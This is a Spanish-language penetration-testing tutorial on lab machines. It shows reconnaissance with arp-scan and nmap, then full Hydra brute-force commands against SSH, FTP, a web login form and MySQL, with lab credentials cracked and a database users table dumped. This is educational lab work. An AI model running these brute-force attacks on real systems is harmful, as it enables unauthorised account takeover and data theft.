# Uso de Hydra

Comenzamos con el uso de la herramienta hydra, la cual nos permitirá realizar ataques de fuerza bruta a distintos protocolos de red, de tal forma que podremos utilizar un diccionario con multitud de posibles contraseñas o usuarios y a una velocidad muy alta ir probando una por una dentro del protocolo SSH o FTP.

Enlace para descargar la máquina vulnerable:

[https://hackmyvm.eu/machines/machine.php?vm=Friendly3](https://hackmyvm.eu/machines/machine.php?vm=Friendly3)

* Encontrar la máquina objetivo con arp-scan haciendo reconocimiento de la red:

```bash
└─# arp-scan -I eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 08:00:27:ba:28:e1, IPv4: 192.168.1.18
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	a8:9a:93:66:15:50	Sagemcom Broadband SAS
192.168.1.15	f4:7b:09:52:3d:48	Intel Corporate
192.168.1.29	08:00:27:5c:65:ec	PCS Systemtechnik GmbH
192.168.1.23	d2:7d:e9:5c:60:ea	(Unknown: locally administered)
192.168.1.28	74:40:be:9e:eb:4a	LG Innotek
192.168.1.11	d8:1e:dd:32:a2:9d	GUANGDONG OPPO MOBILE TELECOMMUNICATIONS CORP.,LTD
192.168.1.13	fe:d5:2d:56:5a:08	(Unknown: locally administered)

7 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.402 seconds (106.58 hosts/sec). 7 responded
```

* Comprobar conectividad con la máquina:

```bash
└─# ping -c 1 192.168.1.29
PING 192.168.1.29 (192.168.1.29) 56(84) bytes of data.
64 bytes from 192.168.1.29: icmp_seq=1 ttl=64 time=3.55 ms

--- 192.168.1.29 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 3.554/3.554/3.554/0.000 ms
```

* Escanear puertos en la máquina objetivo:

```bash
└─# nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.1.29
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 02:09 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:09
Completed NSE at 02:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:09
Completed NSE at 02:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:09
Completed NSE at 02:09, 0.00s elapsed
Initiating ARP Ping Scan at 02:09
Scanning 192.168.1.29 [1 port]
Completed ARP Ping Scan at 02:09, 0.15s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 02:09
Scanning 192.168.1.29 [65535 ports]
Discovered open port 22/tcp on 192.168.1.29
Discovered open port 21/tcp on 192.168.1.29
Discovered open port 80/tcp on 192.168.1.29
Completed SYN Stealth Scan at 02:09, 9.54s elapsed (65535 total ports)
Initiating Service scan at 02:09
Scanning 3 services on 192.168.1.29
Completed Service scan at 02:10, 6.03s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.1.29.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:10
Completed NSE at 02:10, 3.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:10
Completed NSE at 02:10, 0.04s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:10
Completed NSE at 02:10, 0.00s elapsed
Nmap scan report for 192.168.1.29
Host is up, received arp-response (0.0010s latency).
Scanned at 2024-10-09 02:09:47 CEST for 19s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFC2DVBfq6sqSsCS9Jg+TZN7bqZ4U5G/tKb5dD3M69VVHwPRuMmify8CmxFhlP33nMhZTvYSZIpjGuiPSjks5UA=
|   256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICDxFT3mwConXgCXORTtuda6Onx3sMQgZb6CzY2tWc3l
80/tcp open  http    syn-ack ttl 64 nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
MAC Address: 08:00:27:5C:65:EC (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:10
Completed NSE at 02:10, 0.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:10
Completed NSE at 02:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:10
Completed NSE at 02:10, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.63 seconds
           Raw packets sent: 68877 (3.031MB) | Rcvd: 65536 (2.621MB)
```

## Ataques de Fuerza Bruta a Contraseñas (SSH y FTP)

* En el servidor web de la máquina objetivo encontramos un posible usuario donde usaremos hydra para usar fuerza bruta contra el servicio ssh que estaba abierto para conseguir la contraseña:

```bash
└─# hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.29
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-09 02:24:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.29:22/
[22][ssh] host: 192.168.1.29   login: juan   password: alexis
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-09 02:25:25
```

* Conectarse por ssh para poder probar las credenciales:

```bash
└─# ssh juan@192.168.1.29
The authenticity of host '192.168.1.29 (192.168.1.29)' can't be established.
ED25519 key fingerprint is SHA256:qcoxC68+orQ8LIJrunR2ElUTnj9X5X0OFj9F/oxHDjc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.29' (ED25519) to the list of known hosts.
juan@192.168.1.29's password: alexis
Linux friendly3 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
juan@friendly3:~$ exit
logout
Connection to 192.168.1.29 closed.
```

* También podemos usar el mismo ataque pero para el servicio ftp:

```bash
└─# hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.29
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-09 02:26:48
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.1.29:21/
[21][ftp] host: 192.168.1.29   login: juan   password: alexis
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-09 02:27:18
```

* Conectarse por ftp para poder probar las credenciales:

```bash
└─# ftp 192.168.1.29
Connected to 192.168.1.29.
220 (vsFTPd 3.0.3)
Name (192.168.1.29:red): juan
331 Please specify the password.
Password: alexis
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> exit
221 Goodbye.
```

## Ataques de Fuerza Bruta a Usuarios (SSH y FTP)

* También podemos hacer un ataque de fuerza bruta a usuarios con diccionario usando hydra hacia el servicio ssh:

```bash
└─# hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://192.168.1.29
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-09 02:40:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 169 login tries (l:169/p:1), ~11 tries per task
[DATA] attacking ssh://192.168.1.29:22/
[22][ssh] host: 192.168.1.29   login: juan   password: alexis
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-09 02:41:18
```

* También el mismo ataque pero hacia el servicio ftp:

```bash
└─# hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ftp://192.168.1.29
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-09 02:43:36
[DATA] max 16 tasks per 1 server, overall 16 tasks, 169 login tries (l:169/p:1), ~11 tries per task
[DATA] attacking ftp://192.168.1.29:21/
[21][ftp] host: 192.168.1.29   login: juan   password: alexis
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-09 02:44:15
```

***

## Ataques de Fuerza Bruta a Paneles de Login Web

A continuación, vamos a ver cómo hacer un ataque de fuerza bruta en caso de encontrarnos ante un panel de login web, de tal forma que utilizaremos burp suite para saber cuál es la ruta exacta para llegar al panel de login y además podremos ver cómo se está tramitando el envío de las credenciales de dicha web, para posteriormente proporcionárselo a hydra para efectuar el ataque.

Enlace para obtener la máquina vulnerable:

[https://vulnyx.com/#blog](https://vulnyx.com/#blog)

* Encontrar la máquina objetivo con arp-scan haciendo reconocimiento de la red:

```bash
└─# arp-scan -I eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 08:00:27:ba:28:e1, IPv4: 192.168.1.18
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.15	f4:7b:09:52:3d:48	(Unknown)
192.168.1.1	a8:9a:93:66:15:50	(Unknown)
192.168.1.28	74:40:be:9e:eb:4a	(Unknown)
192.168.1.11	d8:1e:dd:32:a2:9d	(Unknown)
192.168.1.53	08:00:27:1b:f4:83	(Unknown)
192.168.1.13	fe:d5:2d:56:5a:08	(Unknown: locally administered)

6 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.106 seconds (121.56 hosts/sec). 6 responded
```

* Comprobar conectividad con la máquina:

```bash
└─# ping -c 1 192.168.1.53
PING 192.168.1.53 (192.168.1.53) 56(84) bytes of data.
64 bytes from 192.168.1.53: icmp_seq=1 ttl=64 time=6.41 ms

--- 192.168.1.53 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 6.407/6.407/6.407/0.000 ms
```

* Escanear puertos en la máquina objetivo:

```bash
└─# nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.1.53
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 00:05 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:05
Completed NSE at 00:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:05
Completed NSE at 00:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:05
Completed NSE at 00:05, 0.00s elapsed
Initiating ARP Ping Scan at 00:05
Scanning 192.168.1.53 [1 port]
Completed ARP Ping Scan at 00:05, 0.21s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:05
Scanning 192.168.1.53 [65535 ports]
Discovered open port 80/tcp on 192.168.1.53
Discovered open port 22/tcp on 192.168.1.53
Completed SYN Stealth Scan at 00:05, 8.98s elapsed (65535 total ports)
Initiating Service scan at 00:05
Scanning 2 services on 192.168.1.53
Completed Service scan at 00:05, 6.06s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.1.53.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:05
Completed NSE at 00:05, 0.56s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:05
Completed NSE at 00:05, 0.10s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:05
Completed NSE at 00:05, 0.01s elapsed
Nmap scan report for 192.168.1.53
Host is up, received arp-response (0.00076s latency).
Scanned at 2024-10-13 00:05:23 CEST for 16s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 56:9b:dd:56:a5:c1:e3:52:a8:42:46:18:5e:0c:12:86 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvP+nzjXx0MojZQQCW27cnX4fHI6Zfub+piYXeaHgfBmDFPoMYHx4otLd0WYGxEvAj+EulcPzJGSEBKOOYy8Ps/oGl6fYnZPPtFFfcDy9kNs2yO9NW+KyUKVediAHp6Rnp4Zi6PT1/oSpx1+86reK2zLQTXXxxlvWrL2DazbyYP8GPD5r7feE5zm6YEJVvPxWilMyeX4k8OMoVYf/ZXuFL1gPdCE5LacDjdo+VDzfZKPW9eQgMJSgrMf/2B+kGdyUzdWj7M7Aj38IXE5W+YFXrbIgbDNX3xOKE1ZccGYaRwVDhIHQkqj3Jpf+XHK7TsV8hIgsflp0va4KbM2rSRjRb
|   256 1b:d2:cc:59:21:50:1b:39:19:77:1d:28:c0:be:c6:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAKYWhPLOiaW31sJCEaBtXD5RSxuzcN9uB0JnDUulTMJKXxxWuco2pcTSOPa7F7Toot+7EkDcIm9LvzMbZb2QxQ=
|   256 9c:e7:41:b6:ad:03:ed:f5:a1:4c:cc:0a:50:79:1c:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPw3uKOB2EOYxw6OFmuDs5M4jz46qKxKv5hnNwP5dX8v
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:1B:F4:83 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:05
Completed NSE at 00:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:05
Completed NSE at 00:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:05
Completed NSE at 00:05, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.95 seconds
           Raw packets sent: 67327 (2.962MB) | Rcvd: 65536 (2.621MB)
```

* Realizar el ataque de fuerza bruta contra el panel de login con hydra:

```bash
└─# hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.53 http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password."
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-13 00:52:07
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://192.168.1.53:80/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password.
[STATUS] 136.00 tries/min, 136 tries in 00:01h, 14344263 to do in 1757:53h, 64 active
[80][http-post-form] host: 192.168.1.53   login: admin   password: kisses
```

***

## Ataques de Fuerza Bruta contra Bases de Datos

A continuación también aprenderemos cómo realizar un ataque de fuerza bruta si nos encontramos con una máquina que tenga abierto algún puerto donde corra una base de datos, por lo que realizaremos otro ataque de fuerza bruta para obtener la contraseña de la base de datos y luego poder entrar.

Enlace a la plataforma de comunidad hacking ético para obtener la máquina “CapyPenguin”:

[https://ctf.comunidadhackingetico.es/challenges?category=medio](https://ctf.comunidadhackingetico.es/challenges?category=medio)

Enlace directo de descarga:

[https://drive.google.com/file/d/1kJsjmttn7McRuj8Tx71ootLMnTnaIWo4/view?usp=sharing](https://drive.google.com/file/d/1kJsjmttn7McRuj8Tx71ootLMnTnaIWo4/view?usp=sharing)

* Hacer reconocimiento de la red para encontrar la máquina objetivo y hacer ping para comprobar la conectividad:

```bash
└─# arp-scan -I eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 08:00:27:ba:28:e1, IPv4: 192.168.1.18
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	a8:9a:93:66:15:50	(Unknown)
192.168.1.15	f4:7b:09:52:3d:48	(Unknown)
192.168.1.20	72:3e:ee:27:01:89	(Unknown: locally administered)
192.168.1.32	08:00:27:ae:21:0b	(Unknown)
192.168.1.14	de:66:3f:1f:fb:5b	(Unknown: locally administered)
192.168.1.11	d8:1e:dd:32:a2:9d	(Unknown)
192.168.1.13	fe:d5:2d:56:5a:08	(Unknown: locally administered)

7 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.040 seconds (125.49 hosts/sec). 7 responded

└─# ping -c 1 192.168.1.32
PING 192.168.1.32 (192.168.1.32) 56(84) bytes of data.
64 bytes from 192.168.1.32: icmp_seq=1 ttl=64 time=5.69 ms

--- 192.168.1.32 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 5.691/5.691/5.691/0.000 ms
```

* Escanear puertos de la máquina objetivo con nmap:

```bash
└─# nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.1.32
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 01:38 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:38
Completed NSE at 01:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:38
Completed NSE at 01:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:38
Completed NSE at 01:38, 0.00s elapsed
Initiating ARP Ping Scan at 01:38
Scanning 192.168.1.32 [1 port]
Completed ARP Ping Scan at 01:38, 0.15s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 01:38
Scanning 192.168.1.32 [65535 ports]
Discovered open port 3306/tcp on 192.168.1.32
Discovered open port 22/tcp on 192.168.1.32
Discovered open port 80/tcp on 192.168.1.32
Completed SYN Stealth Scan at 01:38, 30.05s elapsed (65535 total ports)
Initiating Service scan at 01:38
Scanning 3 services on 192.168.1.32
Completed Service scan at 01:38, 6.03s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.1.32.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:38
Completed NSE at 01:38, 5.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:38
Completed NSE at 01:38, 1.27s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:38
Completed NSE at 01:38, 0.00s elapsed
Nmap scan report for 192.168.1.32
Host is up, received arp-response (0.0044s latency).
Scanned at 2024-10-13 01:38:09 CEST for 42s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:62:05:8b:a8:f5:41:6d:43:94:01:32:a1:6c:d8:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP7T2SJxdfwT0uXOb38Cfcj/3sHAtCK0QXHWbfmrw4eX9y6J7acbCZQv+6oLsm0CoftzXyqm5kZZIf+GcKxX7C0=
|   256 ac:89:34:2f:fa:17:71:de:1e:6d:bc:6b:e2:d2:29:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKgFYkWUtPnDgKeoT3OtuOBMeTQeYzfBBDfpNvBOp70n
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Web de Capybaras
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
3306/tcp open  mysql   syn-ack ttl 64 MySQL 8.0.35-0ubuntu0.22.04.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.35_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_8.0.35_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-11-16T11:36:03
| Not valid after:  2033-11-13T11:36:03
| MD5:   1539:dfa9:ad26:6532:c4e5:4df2:24dc:5b1a
| SHA-1: f58b:ea93:71ac:5328:dfb1:0d41:b8f5:46bb:a020:e80f
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfOC4wLjM1X0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIzMTExNjExMzYwM1oXDTMzMTExMzExMzYwM1owQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzguMC4zNV9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCzOzWpsGwbvFIae2eMlioq
| /pbEq4A+c+zWWYyzOYA1xSEsecy9weCwndXH9i8BTNfWfBa1R3xAxK5Pvph6HU/K
| y8YJFh/etkMvlnkdQkEIf5SeJuIK/o3G4T8vvmQliWJkgpfMkWoGPrpzdp4hNEWV
| gZPQPLL8UL/SqAE72WARR35qaQjhixqRYRxEH3HL0YzWvo4JsvSZEabxHKLJ8ydR
| mvDsLbRhFKF/mP4N7OITLuCO6FSgW8ONMEH8VF8bDoT1xrn4pN385hHWxiANk6qT
| wcmo18CSMD+hiTaNzI5mfc7XtKI0WGTnwlU5O0xGW0MU6MQFPAqrkmBgN4Hf1NLh
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAKp33dWv
| b7GiWpMTogEQlRK2yr2czYr2xDT0ry0oDyCJEcLBIK0bJWEW0y6zLTiqSMorDYjx
| Rpq38RhLi38e5bet1vLZgqEscERq9WB4Y3iG5W1UuZ3O1XSPgUUD6b//I1Wwkzi0
| GBuCLm1Emmw55hFRA44a4+g0c5GDgA2S39CreTWLefvSRcRX5k0bClCGDZMj2+wt
| 4bqq51jbm+rqEjmdM3MXDKR0tvcAc6fCWKEiqw7YD1FHKaBMnRkqoafET2BaZOsl
| VshLeg9+yDbNjakX70RT8h9H1N4fgh1MQ+4C2MA4xH7tjJCyJyOAK/3P28AlXfYI
| wBsDQCYHqhYOznM=
|_-----END CERTIFICATE-----
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.35-0ubuntu0.22.04.1
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, InteractiveClient, SwitchToSSLAfterHandshake, Support41Auth, FoundRows, ConnectWithDatabase, LongColumnFlag, SupportsCompression, ODBCClient, LongPassword, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: Ufw\x10
| h`\x06,,2!wP2K29\x15\x08
|_  Auth Plugin Name: caching_sha2_password
MAC Address: 08:00:27:AE:21:0B (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:38
Completed NSE at 01:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:38
Completed NSE at 01:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:38
Completed NSE at 01:38, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.17 seconds
           Raw packets sent: 131074 (5.767MB) | Rcvd: 10 (424B)
```

En en el servidor web encontramos que en la página web en el codigo fuente hay un posible usuario llamado capybarauser.

* Ataque de fuerza bruta con hydra:

```bash
└─# hydra -l capybarauser -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.32
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-13 01:46:57
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://192.168.1.32:3306/
[STATUS] 3250.00 tries/min, 3250 tries in 00:01h, 14341149 to do in 73:33h, 4 active
```

Vemos que tarda mucho porque la posible contraseña este al final del diccionario, entonces podemos invertir el diccionario y probar de nuevo el mismo ataque con hydra.

```bash
└─# tac /usr/share/wordlists/rockyou.txt > rockyou_invert.txt

└─# nano rockyou_invert.txt                                
# Eliminar primera línia y los caracteres de las 3 primeras línias.

└─# cat rockyou_invert.txt | tr -d ' ' > rockyou_inver.txt  

└─# hydra -l capybarauser -P rockyou_inver.txt mysql://192.168.1.32 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-13 01:56:59
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344385 login tries (l:1/p:14344385), ~3586097 tries per task
[DATA] attacking mysql://192.168.1.32:3306/
[3306][mysql] host: 192.168.1.32   login: capybarauser   password: ie168
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-13 01:57:12
```

* Conectarse por mysql con las credenciales:

```bash
└─# mysql -h 192.168.1.32 -u capybarauser -p'ie168' --ssl=0 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 18832
Server version: 8.0.35-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

* Ver información de la base de datos:

```bash
MySQL [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| pinguinasio_db     |
| sys                |
+--------------------+
5 rows in set (0.027 sec)

MySQL [(none)]> USE pinguinasio_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [pinguinasio_db]> SHOW TABLES;
+--------------------------+
| Tables_in_pinguinasio_db |
+--------------------------+
| users                    |
+--------------------------+
1 row in set (0.003 sec)

MySQL [pinguinasio_db]> SELECT * FROM users;
+----+-------+------------------+
| id | user  | password         |
+----+-------+------------------+
|  1 | mario | pinguinomolon123 |
